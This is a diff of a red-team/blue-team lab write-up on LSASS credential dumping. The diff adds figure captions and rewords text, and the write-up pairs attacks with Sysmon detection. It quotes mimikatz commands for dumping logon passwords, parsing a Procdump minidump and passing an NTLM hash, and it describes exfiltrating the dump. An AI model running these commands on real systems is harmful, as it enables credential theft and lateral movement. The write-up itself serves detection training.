@@ -22,7 +22,8 @@ The attacker interacts directly with LSASS memory through an active implant to r
 
 ### Attack Simulation (Red Team)
 
-Credential dumping is executed from a SYSTEM-level session.
+Credential dumping is executed from a SYSTEM-level session.  
+Privilege validation confirms SeDebugPrivilege is enabled prior to memory access.
 
 **Command**
 ```bash
@@ -30,9 +31,19 @@ getprivs
 mimikatz "privilege::debug" "sekurlsa::logonpasswords"
 ```
 
-**[Screenshot required]**
+<p align="center">
+  <img src="images/systemproof.png">
+</p>
+<p align="center">
+  <em>Figure 4.1: SYSTEM-level session confirmed and SeDebugPrivilege enabled</em>
+</p>
 
-Credentials are extracted directly from memory without creating a dump file.
+<p align="center">
+  <img src="images/offline.png">
+</p>
+<p align="center">
+  <em>Figure 4.2: Credentials extracted directly from LSASS memory</em>
+</p>
 
 ---
 
@@ -51,22 +62,29 @@ TargetImage="C:\\Windows\\system32\\lsass.exe"
 **[Screenshot required]**
 
 **Assessment**  
-Non-system binaries accessing LSASS memory represent high-confidence credential theft activity.
+Non-system binaries accessing LSASS memory represent high-confidence credential theft behavior.
 
 ---
 
 ## Phase 4b — Offline Credential Dumping (Procdump)
 
 **Scenario**  
-To reduce on-host detection, a signed Microsoft tool is used to dump LSASS memory to disk for offline analysis.
+To reduce live detection risk, a signed Microsoft Sysinternals utility is used to dump LSASS memory to disk for offline analysis.
 
-This blends malicious behavior with legitimate administrative tooling.
+This technique blends malicious behavior with legitimate administrative tooling.
 
 ---
 
 ### Attack Simulation (Red Team)
 
-A Sysinternals utility is staged and executed to create a memory dump.
+The Sysinternals Procdump tool is retrieved by the attacker and discreetly uploaded to the victim host. The utility is then used to create a memory dump for off-host parsing.
+
+<p align="center">
+  <img src="images/uwget.png">
+</p>
+<p align="center">
+  <em>Figure 4.3: Procdump retrieved and staged from the attacker environment</em>
+</p>
 
 **Command**
 ```bash
@@ -77,7 +95,26 @@ sekurlsa::minidump /home/kali/lsass.dmp
 sekurlsa::logonpasswords
 ```
 
-**[Screenshot required]**
+<p align="center">
+  <img src="images/procdump.png">
+</p>
+<p align="center">
+  <em>Figure 4.4: Procdump executing against LSASS</em>
+</p>
+
+<p align="center">
+  <img src="images/download.png">
+</p>
+<p align="center">
+  <em>Figure 4.5: Memory dump exfiltrated to attacker system</em>
+</p>
+
+<p align="center">
+  <img src="images/wine.png">
+</p>
+<p align="center">
+  <em>Figure 4.6: Offline credential parsing using Mimikatz</em>
+</p>
 
 Credential parsing occurs off-host to minimize endpoint visibility.
 
@@ -121,7 +158,7 @@ mimikatz "sekurlsa::pth /user:FADWIN10 /domain:FADHLI-PC /ntlm:<hash> /run:cmd.e
 
 **[Screenshot required]**
 
-Authentication is performed using the stolen hash rather than a password.
+Authentication is performed using the stolen hash rather than a plaintext password.
 
 ---
 
